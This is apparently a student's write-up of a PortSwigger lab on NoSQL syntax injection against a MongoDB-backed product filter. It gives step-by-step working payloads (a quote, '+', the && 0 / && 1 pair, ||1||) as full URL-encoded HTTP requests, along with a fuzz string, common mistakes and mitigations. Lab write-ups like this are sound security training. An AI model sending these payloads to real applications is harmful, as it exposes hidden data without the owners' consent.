# 📘 PortSwigger Lab: Detecting NoSQL injection

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/all-labs/nosql-injection/lab-nosql-injection-detection  
> 🎯 Topic: NoSQL Injection — detecting syntax injection in MongoDB  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  
> 🛠 Tools: Burp Suite (Repeater)

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🗺 The Methodology in 5 Steps](#methodology)
- [🔍 Step 1 — Recon: Intercept the Filter Request](#step1)
- [🔍 Step 2 — Detect: a Single Quote Breaks the Query](#step2)
- [🔍 Step 3 — Confirm: a Valid Payload Repairs the Query](#step3)
- [🔍 Step 4 — Boolean Tests: False and True](#step4)
- [🔍 Step 5 — Exploitation: Show Everything via `||1||`](#step5)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

The product category filter is powered by MongoDB and is vulnerable to NoSQL injection. The task:

```text
Perform a NoSQL injection attack that causes the application
to display unreleased products.
```

---

<a id="theory"></a>

## 🧠 Short Theory

There are two types of NoSQL injection:

```text
1. Syntax injection   — break the query syntax, inject your own code
                        (methodology similar to SQLi, different syntax)
2. Operator injection — inject query operators ($ne, $gt, $where)
```

MongoDB stores data in documents; queries against it are JavaScript-like expressions:

```javascript
this.category == 'Gifts'
```

Key facts:

```text
- The query is a JS expression: the && (AND) and || (OR) operators work
- User input is inserted inside the quoted string of the expression
- An unbalanced quote breaks the syntax → JavaScript error (often HTTP 500)
- MongoDB may ignore everything after a null byte (%00)
```

---

<a id="idea"></a>

## 🧩 Core Idea

User input lands inside the string of a JS expression **unsanitized**. Therefore:

```text
Input:        Gifts' && 1 && 'x
The query:    this.category == 'Gifts' && 1 && 'x'
                                            ↑ the quote from the input exits the context
```

By closing the quote and appending an expression, we extend the query's logic. The final payload `||1||` adds an "OR 1" condition — always true, so the category filter stops constraining the query and all products are returned.

---

<a id="methodology"></a>

## 🗺 The Methodology in 5 Steps

```text
1. Detect        → a quote breaks the query (error / changed response)
2. Confirm       → a valid JS construct repairs the query
3. Boolean test  → false and true conditions yield different responses
4. Exploit       → an "always true" condition overrides the logic
5. Verify        → data hidden by the filter appears in the response
```

A direct analog of the SQLi methodology (detect → confirm → boolean → exploit) with JS syntax.

---

<a id="step1"></a>

## 🔍 Step 1 — Recon: Intercept the Filter Request

1. Open the lab, click any category (e.g., Gifts).
2. Burp → Proxy → HTTP history → find the request:

```http
GET /filter?category=Gifts HTTP/2
```

3. Right-click → Send to Repeater.

The server-side expression (assumed):

```javascript
this.category == 'Gifts'
```

---

<a id="step2"></a>

## 🔍 Step 2 — Detect: a Single Quote Breaks the Query

In Repeater, append a quote to the category:

```text
category=Gifts'
```

(highlight the `'` and press Ctrl+U for URL encoding).

The server-side query:

```javascript
this.category == 'Gifts''    ← an unbalanced quote → syntax error
```

**Expected:** a JavaScript error (in this lab — a changed/erroneous response). This signals that input is not filtered and lands in the JS expression as-is.

---

<a id="step3"></a>

## 🔍 Step 3 — Confirm: a Valid Payload Repairs the Query

Send:

```text
category=Gifts'+
```

after Ctrl+U (important!):

```http
GET /filter?category=Gifts'%2b' HTTP/2
```

The server-side query:

```javascript
this.category == 'Gifts'+''    ← valid JS: strings concatenated
```

**Expected:** the error is gone, the normal Gifts product list returns.

**Conclusion:** `'` breaks + `'+'` repairs = confirmed syntax injection, not just "the site dislikes quotes".

---

<a id="step4"></a>

## 🔍 Step 4 — Boolean Tests: False and True

**False condition:**

```text
category=Gifts' && 0 && 'x
```

```javascript
this.category == 'Gifts' && 0 && 'x'    → 0 = false → NO products
```

**True condition:**

```text
category=Gifts' && 1 && 'x
```

```javascript
this.category == 'Gifts' && 1 && 'x'    → 1 = true → products RETURN
```

**Expected:** different responses to false and true.

**Conclusion:** the injection controls the server-side query — arbitrary boolean logic can be injected.

---

<a id="step5"></a>

## 🔍 Step 5 — Exploitation: Show Everything via `||1||`

Send:

```text
category=Gifts'||1||'
```

The server-side query:

```javascript
this.category == 'Gifts'||1||''    → 'Gifts' OR 1 → always true
```

The condition is always true → the category filter stops constraining the query → the response contains **all products, including unreleased ones**.

**Verification:**

1. Right-click the response → Show response in browser.
2. Copy the URL, open it in Burp's browser.
3. The listing shows products without the released flag → the lab is Solved.

---

<a id="requests"></a>

## 📨 Example Requests

### Step 2 — detect

```http
GET /filter?category=Gifts%27 HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

### Step 3 — confirm

```http
GET /filter?category=Gifts'%2b' HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

### Step 4a — false

```http
GET /filter?category=Gifts'%20%26%26%200%20%26%26%20%27x HTTP/2
```

### Step 4b — true

```http
GET /filter?category=Gifts'%20%26%26%201%20%26%26%20%27x HTTP/2
```

### Step 5 — exploit

```http
GET /filter?category=Gifts'%7c%7c1%7c%7c%27 HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

---

<a id="response"></a>

## 📥 Example Result

### Step 2 — syntax error

```text
HTTP/2 500 Internal Server Error
or a changed response instead of the product list
```

### Step 3 — normal listing

```text
HTTP/2 200 OK
→ products of the Gifts category
```

### Step 4a — empty result

```text
→ no products (0 = false)
```

### Step 4b — normal result

```text
→ Gifts products (1 = true)
```

### Step 5 — all products

```text
HTTP/2 200 OK
→ the full catalog, including unreleased products

Lab status: Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the lab, click a category → GET /filter?category=Gifts to Repeater
2. Gifts' → syntax error (detect)
3. Gifts'+' (Ctrl+U!) → the error is gone (injection confirmed)
4. Gifts' && 0 && 'x → empty; Gifts' && 1 && 'x → products (boolean control)
5. Gifts'||1||' → all products, including unreleased
6. Show response in browser → the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. Input Lands in a JS Expression Unsanitized

The server builds `this.category == '<input>'` by string concatenation. Any injected syntax is interpreted by the JS engine.

### 2. The Quote Is the Context-Escape Point

`'` closes the string; from there the attacker writes arbitrary JS. No escaping/sanitization existed at all.

### 3. && / || Are Native Operators of the Query Language

A MongoDB query is JavaScript, so boolean logic is injected directly — no UNION-style tricks needed as in SQLi.

### 4. `||1||` Neutralizes the Original Filter

The "OR 1" condition is always true → the category criterion becomes irrelevant → every document in the collection is returned, including hidden ones.

### 5. The Response Reveals Data Directly

The affected function displays the query results — this is a non-blind injection; everything is visible in the response.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

The checklist for testing any input for NoSQL syntax injection:

```text
1. Fuzz string:  '"`{\r;$Foo}\n$Foo \xYZ  → did the response change?
2. One character: ' → error?
3. Repair:        '\' or '+' → did the response normalize?
4. Boolean pair:  ' && 0 && 'x  vs  ' && 1 && 'x → different responses?
5. Exploitation:  '||1||' → hidden data?
```

Key discipline: **URL-encode every special character** (Ctrl+U in Burp). `+` in a URL means space; unencoded `&&` and `|` break the URL itself rather than the DB query — yielding a false "not vulnerable" conclusion.

And remember: an "always true" condition is only safe in a read context. The same parameter may feed UPDATE/DELETE queries — check the context before sending such a payload to a real system.

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Not Encoding the `+`

`category=Gifts'+'` unencoded: the server reads `+` as a space → `Gifts' ''` → invalid JS → 500. Correct: `Gifts'%2b'`. This is the main trap of this lab.

### Mistake 2. A Quote Before the Value

The payload `'Gifts'+''` adds a quote at the beginning — it breaks the context prematurely → 500. All quotes go after the value only.

### Mistake 3. Not Encoding `&&` and `||`

Raw `&` and `|` in a URL are parameter separators and special characters. The request breaks at the URL level, not the DB → a false "not vulnerable" verdict.

### Mistake 4. Stopping After the Step 2 Error

An error on `'` is not "the site is broken" — it is a vulnerability signal. Step 3 (the repair) is mandatory; otherwise an injection cannot be distinguished from plain validation.

### Mistake 5. Looking Only at the HTTP Status

The Step 5 response may be 200, but what matters is the content: did unreleased products appear? Verify by content, not by status.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Input Sanitization and Validation

Filter/escape special characters (`'`, `"`, `$`, `{`, `}`, `\`, null byte) before substituting them into a query.

### 2. Parameterized Queries Instead of Concatenation

Use driver-native mechanisms: filters as data structures, not JS expressions assembled from strings.

```javascript
// bad: string concatenation into $where / expressions
// good: a structured filter
collection.find({ category: userInput })
```

### 3. Minimize $where and Server-Side JS Execution

Avoid `$where` and `mapReduce` with user-controlled data where ordinary operators suffice.

### 4. Least-Privilege Database Accounts

The application's DB account should not hold update/delete rights reachable from read contexts.

### 5. Consistent Input Handling Across All Queries

One parameter may feed multiple queries (read/update/delete) — sanitize at the input boundary, not ad hoc.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Filter request found: GET /filter?category=Gifts
- [ ] Sent to Repeater

### Detect and Confirm

- [ ] `Gifts'` (encoded) → error / changed response
- [ ] `Gifts'%2b'` → error gone, normal listing

### Boolean Control

- [ ] `Gifts' && 0 && 'x` → empty result
- [ ] `Gifts' && 1 && 'x` → products return

### Exploitation

- [ ] `Gifts'||1||'` → unreleased products in the listing
- [ ] Show response in browser → lab Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved via **NoSQL syntax injection against MongoDB**:

```text
1. A quote breaks the JS query expression        → detect
2. The valid construct ' Gifts'+' ' repairs it   → confirmation
3. The && 0 / && 1 pair proves logic control
4. ||1|| overrides the filter                    → all products, including unreleased
```

Main lessons:

```text
NoSQL syntax injection = the SQLi methodology on a different syntax: detect → confirm → boolean → exploit.
```

```text
URL encoding is part of the payload: + means space, && and | break the URL before the DB.
```

```text
An "always true" condition overrides any filter — but is only safe in a read context.
```

```text
Mitigation: structured filters instead of concatenation, input sanitization, avoiding $where.
```

---

[⬆ Back to top](#top)
